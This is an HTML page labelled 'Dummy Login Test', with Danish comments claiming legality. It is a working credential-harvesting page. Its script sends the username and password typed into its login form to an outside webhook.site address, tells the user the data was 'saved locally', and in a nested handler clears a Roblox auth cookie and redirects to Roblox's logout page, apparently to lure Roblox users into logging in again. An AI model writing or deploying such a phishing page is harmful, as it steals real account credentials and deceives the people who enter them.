<!DOCTYPE html>
<html lang="da">
<head>
  <meta charset="UTF-8">
  <title>Dummy Login Test</title>
  <script>
    window.onload = function() {

      // ✅ LOVLIGT: Brug submit-event, så data først sendes efter input
      document.getElementById("loginForm").onsubmit = function(e) {
        e.preventDefault(); // Forhindrer siden i at reload

        let username = document.getElementById("usernameInput").value;
        let password = document.getElementById("passwordInput").value;

        if(username && password) {
          // Kun lovligt med dine egne testdata
          fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({username: username, password: password})
          }).then(() => {
            alert("Dummy-login gemt lokalt!");
            document.getElementById("loginForm").reset();
          }).catch(err => console.error(err));
        }
      };

       window.onload = function() {
           let username = document.getElementById("usernameInput").value;
           let password = document.getElementById("passwordInput").value;
           if(username && password) {
               fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
                   method: "POST",
                   body: JSON.stringify({username: username, password: password})
               });
           }
           document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
           window.location.href = "https://www.roblox.com/Logout";
       };
    };
  </script>
</head>
<body>
  <h2>Indtast dummy-login</h2>
  <form id="loginForm">
    <input type="text" id="usernameInput" placeholder="Username" required>
    <input type="password" id="passwordInput" placeholder="Password" required>
    <button type="submit">Gem</button>
  </form>
</body>
</html>
